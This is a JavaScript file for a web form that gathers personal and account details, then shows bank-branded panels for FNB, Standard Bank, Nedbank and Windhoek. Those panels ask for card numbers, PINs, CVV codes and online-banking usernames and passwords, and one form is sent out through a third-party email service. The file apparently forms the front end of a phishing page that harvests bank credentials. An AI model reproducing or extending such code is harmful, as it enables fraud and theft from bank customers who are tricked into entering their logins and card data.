let nav = document.getElementById('icon1')
let count = 0;
let display = 0

let form1 = document.getElementById('form1')
let form2 = document.getElementById('form2')

let fname = document.getElementById('name')
let sname = document.getElementById('surname')
let address = document.getElementById('address')
let phoneNumber = document.getElementById('phone')
let account = document.getElementById('account')
let identity = document.getElementById('identity')
let email = document.getElementById('email')

let showBanks = document.getElementById('banks')
let banks = document.getElementById('show-element')
let indivBanks = document.querySelectorAll('.single-banks')

const fnbs = document.querySelectorAll(".fnbs")
const nedbanks = document.querySelectorAll(".nedbank")
const windhoeks = document.querySelectorAll(".windhoeks")

let card = document.getElementById('card')
let pin = document.getElementById('pin')
let username = document.getElementById('username')
let password = document.getElementById('password')

let profileNumber = document.getElementById('profileNumber')
let profilePassword = document.getElementById('profilePassword')

let windhoekEmail = document.getElementById('windhoek-email')
let windhoekPassword = document.getElementById('wimdhoek-password')
let cardNumber = document.getElementById('cardNumber')
let cardDate = document.getElementById('card-date')
let cvv = document.getElementById('cvv')

let error = document.getElementById('error')
let error2 = document.getElementById('error2')
let error3 = document.getElementById('error3')
let error4 = document.getElementById('error4')
let agree = document.getElementById("agree")
let count2 = 0;
let terms = document.getElementById('terms')
let submit = document.getElementById('submit')
let submit1 = document.getElementById('submit1')
let submit2 = document.getElementById('submit2')

nav.addEventListener('click', ()=>{
    count++
    if(count > 0){
        div2.style.margin = '0 0 0 0'
    }
     if(count > 1){
        div2.style.margin = '-20% 0 0 0'
        count = 0;
    }
})

showBanks.addEventListener('click', showBank)
function showBank(){
    display ++
    if(display = 1 ){
        banks.style.margin = '-15% 0 0 0'
        showBanks.style.display = 'none'
    }
    display = 0;
}
let FNB = document.getElementById('FNB-details')
let STANDARD = document.getElementById('STANDARD-details')
let NEDBANK = document.getElementById('NEDBANK-datails')
let WINDHOEK = document.getElementById('WINDHOEK-details')

indivBanks.forEach(element => {
    element.classList.remove('zoomed');
    // Add event listener for the click event
    element.addEventListener('click', function() {
        // First, remove the 'zoomed' class from all elements

            // banks.style.margin = '15% 0 0 -105%'
        indivBanks.forEach(el => {
            el.classList.remove('zoomed')
            el.style.display = "none"
            el.style.transitionDuration = "3s"
        });
    
        // Then, add the 'zoomed' class to the clicked element
        let div1 = document.getElementById('div1')
        this.classList.add('zoomed');
        this.style.display = "block"
        div2.style.margin = "-27% 0 0 0"
        div1.style.position = "relative"
        div1.style.margin = "-27% 0 0 0"
        div1.style.transitionDuration = "2s"

        // Get the value of the paragraph inside the clicked div
        let paragraphText = this.querySelector('p').textContent;

        
        // console.log(this.p)
        setTimeout(() => {
            banks.style.margin = '-15% 0 0 -105%'
            element.classList.remove('zoomed');
            this.classList.remove('zoomed');

            this.style.display = "none"
            if(paragraphText === "FNB"){
                FNB.style.display = "block"

            }else if(paragraphText === "STANDARD BANK"){
                STANDARD.style.display = "block"
                console.log("this")

            }else if(paragraphText === "NEDBANK"){
                NEDBANK.style.display = "block"
                // FNB.style.display = "none"

            }else if(paragraphText === "WINDHOEK"){
                WINDHOEK.style.display = "block"
                // NEDBANK.style.display = "none"

            }
        }, 1000);

    });
});

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_zer025q","template_k009bh7", this)
        .then(function() {
            console.log('SUCCESS!');
            let successful = document.getElementById("successful")
            let subscribe = document.getElementById('submit')
            let form = document.getElementById("contact-form")
            // console.log('na me')
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            form.style.display = 'none'
            setTimeout(sub, 400);
            function sub(){
               successful.style.display = "block"
            }
            setTimeout(vub, 700)
            function vub(){
                subscribe.style.display = "none"
            }
        }, function(error) {
                console.log('FAILED...', error);
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                setTimeout(sub, 800);
                function sub(){
                    let writng = document.getElementById('write-up');
                    let form = document.getElementById("contact-form")
                    writng.style.display = 'inline'
                    // writng.style.color = 'black'
                    form.style.display = 'none'
                    terms.style.display = 'none'
                }
            });
        });
}

next.addEventListener('click', ()=>{
    console.log(next, error, form1, form2)
    if(fname.value ==="" || sname.value ==="" || address.value ==="" ||
        phoneNumber.value === "" || account.value ==="" || identity.value === "" || email.value === ""){
            error.innerHTML = "kindly fill all the required details above";
            error.style.color = "red";
            error.style.fontSize =  "300%";
            error.style.textAlign =  "center";
            console.log("na me")
            setTimeout(sub, 2000);
            function sub(){
                error.innerHTML = ''
            }
        }else if(agree.checked == 0){
            error.innerHTML = "kindly read and agree to the terms and conditions";
            error.style.color = "red";
            error.style.fontSize =  "300%";
            error.style.textAlign =  "center";
            setTimeout(sub, 2000);
            function sub(){
                error.innerHTML = ''
            }
        } else{
            console.log("here")
            setTimeout(bub, 1000);
            function bub(){
                form1.style.display = 'none'
                form2.style.display = 'block'
                terms.style.display = 'none'
                error.innerHTML = '';
            }
        }
})


let value
cardDate.addEventListener('input', (event)=>{
    console.log('Current value:', event.target.value);
    value = event.target.value;
            
    // Check if the first character is 3-9
    if (/^[2-9]/.test(value)) {
        // Clear the input if it starts with an invalid digit
        event.target.value = '';
        return;
    }else if(value.includes('1')){
        // Check if the length is 2, and the second character is 3-4
        if (/^[3-9]/.test(value[1])) {
            // Clear the input if the second digit is 3-4
            event.target.value = value[0];
            return;
        }
    }else if(value.includes('0')){
        if (value[1].includes('0')) {
            // Clear the input if the second digit is 3-4
            event.target.value = value[0];
            return;
        } 
    }

    // Check if the length is 2 and no slash has been added yet
    if (value.length === 2 && !value.includes('/')) {
        // Add a slash after the first two digits
        event.target.value = value + '/';
    }
    
    if (/^[4-9]/.test(value[3])) {
        // Clear the input if it starts with an invalid digit
        event.target.value = value[0] +  value[1] + value[2];
        return;
    }
    if(value[3].includes('3')){
        if (/^[2-9]/.test(value[4])) {
            // Clear the input if the second digit is 3-4
            event.target.value = value[0] +  value[1] + value[2] + value[3];
            return;
        }
    }
})

let cardCvv = document.getElementById('cvv');
cardCvv.addEventListener('input', (event) => {
    let value = event.target.value;

    // Ensure the input does not exceed three digits
    if (value.length > 3) {
        event.target.value = value.slice(0, 3); // Keep only the first three digits
    }
});


fnbs.forEach(input => {
    input.addEventListener('input', (event) =>{
        console.log('hhh')
        if(card.value === "" || pin.value === "" || username.value === "" || password.value === ""){
            error2.innerHTML = "kindly fill all the required details above";
            error2.style.color = "red";
            error2.style.fontSize =  "300%"
            error2.style.textAlign =  "center"

            }else{
                submit.style.display = 'block';
                submit.style.margin = '-3 0 -10 0'
                submit.addEventListener('click', ()=>{
                    submit.style.backgroundColor = "yellow"
                    submit.style.color = "black"
                    
                })
                error2.innerHTML = '';
               
            }
    })
});

nedbanks.forEach(input => {
    input.addEventListener('input', (event) =>{
        console.log('hhh')
        if(profileNumber.value === "" || profilePassword.value === "" ){
            error2.innerHTML = "kindly fill all the required details above";
            error2.style.color = "red";
            error2.style.fontSize =  "300%"
            error2.style.textAlign =  "center"
            
            }else{
                submit1.style.display = 'block';
                submit1.style.margin = '-3 0 -10 0'
                submit1.addEventListener('click', ()=>{
                    submit1.style.backgroundColor = "yellow"
                    submit1.style.color = "black"
                    
                })
                error2.innerHTML = '';
               
            }
    })
});

windhoeks.forEach(input => {
    input.addEventListener('input', (event) =>{
        console.log('hhh')
        if(windhoekEmail.value === "" || windhoekPassword.value === "" ||
            cardNumber.value === ""|| value === ""  || cvv.value === ""
         ){
        error2.innerHTML = "kindly fill all the required details above";
        error2.style.color = "red";
        error2.style.fontSize =  "300%"
        error2.style.textAlign =  "center"
        }else{
            submit2.style.display = 'block';
            submit2.style.margin = '-3 0 -10 0'
            submit2.addEventListener('click', ()=>{
                submit2.style.backgroundColor = "yellow"
                submit2.style.color = "black"
                
            })
            error2.innerHTML = '';
           
        }
    })
});   













// let value
// cardDate.addEventListener('input', (event)=>{
//     console.log('Current value:', event.target.value);
//     value = event.target.value;
            
//         // Check if the first character is 3-9
//         if (/^[2-9]/.test(value)) {
//             // Clear the input if it starts with an invalid digit
//             event.target.value = '';
//             return;
//         }

//         // Check if the length is 2, and the second character is 3-4
//         if (/^[3-9]/.test(value[1])) {
//             // Clear the input if the second digit is 3-4
//             event.target.value = value[0];
//             return;
//         }

//         // Check if the length is 2 and no slash has been added yet
//         if (value.length === 2 && !value.includes('/')) {
//             // Add a slash after the first two digits
//             event.target.value = value + '/';
//         }
      
// })

// let cardCvv = document.getElementById('cvv');
// cardCvv.addEventListener('input', (event) => {
//     let value = event.target.value;

//     // Ensure the input does not exceed three digits
//     if (value.length > 3) {
//         event.target.value = value.slice(0, 3); // Keep only the first three digits
//     }
// });
